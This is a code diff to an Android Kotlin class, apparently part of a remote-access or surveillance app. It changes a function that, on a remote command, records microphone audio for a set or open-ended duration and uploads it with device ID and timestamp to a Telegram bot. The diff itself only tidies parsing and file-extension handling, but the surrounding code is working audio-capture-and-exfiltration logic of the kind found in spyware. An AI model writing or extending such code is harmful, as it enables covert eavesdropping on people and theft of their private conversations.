@@ -1276,8 +1276,6 @@ class RemoteCommandManager(private val context: Context) {
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
         var durationSec = 10 // default 10 seconds for quick audio capture
-        var maxShots = 1
-        var intervalSec = 2
         val trimmed = payload.trim()
         val lowerTrimmed = trimmed.lowercase()
         if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "3600") {
@@ -1295,20 +1293,11 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
                 }
-                val shots = json.optInt("maxShots", json.optInt("count", json.optInt("shots", json.optInt("max", 1))))
-                if (shots > 0) maxShots = shots.coerceIn(1, 10)
-
-                val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", 2)))
-                if (interval > 0) intervalSec = interval.coerceIn(1, 60)
             } catch (_: Exception) {}
         } else if (trimmed.contains("|")) {
             val parts = trimmed.split("|")
             val dur = parts[0].trim().filter { it.isDigit() }.toIntOrNull()
             if (dur != null && dur > 0) durationSec = dur
-            val shots = parts.getOrNull(1)?.trim()?.toIntOrNull()
-            if (shots != null && shots > 0) maxShots = shots.coerceIn(1, 10)
-            val interval = parts.getOrNull(2)?.trim()?.toIntOrNull()
-            if (interval != null && interval > 0) intervalSec = interval.coerceIn(1, 60)
         } else if (trimmed.contains("=")) {
             val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
             val parsed = valPart.toIntOrNull()
@@ -1326,6 +1315,7 @@ class RemoteCommandManager(private val context: Context) {
             val base64Data = audioHelper.startRecording(finalDuration) ?: throw Exception("Audio recording failed")
             val base64Content = base64Data.substringAfter(",")
             val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
+            val audioExt = "wav"
 
             val nowMs = System.currentTimeMillis()
             val deviceId = try {
@@ -1336,6 +1326,7 @@ class RemoteCommandManager(private val context: Context) {
                 "timestamp" to nowMs,
                 "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                 "durationSeconds" to finalDuration,
+                "extension" to audioExt,
                 "fileSizeBytes" to audioBytes.size,
                 "status" to "Uploaded to Telegram"
             )
@@ -1350,13 +1341,12 @@ class RemoteCommandManager(private val context: Context) {
 
             try {
                 val telegramBot = TelegramBotManager(context)
-                val audioExt = if (base64Data.contains("audio/wav")) "wav" else "amr"
-                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.$audioExt", "Duration: $finalDuration sec (${(audioBytes.size / 1024)} KB)")
+                telegramBot.sendAudio(audioBytes, "audio_${nowMs}.$audioExt", "Duration: $finalDuration sec ($audioExt, ${(audioBytes.size / 1024)} KB)")
             } catch (e: Exception) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
 
-            return@withContext "Successfully recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
+            return@withContext "Successfully recorded $finalDuration seconds audio ($audioExt, ${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
         } finally {
             audioHelper.cleanup()
         }
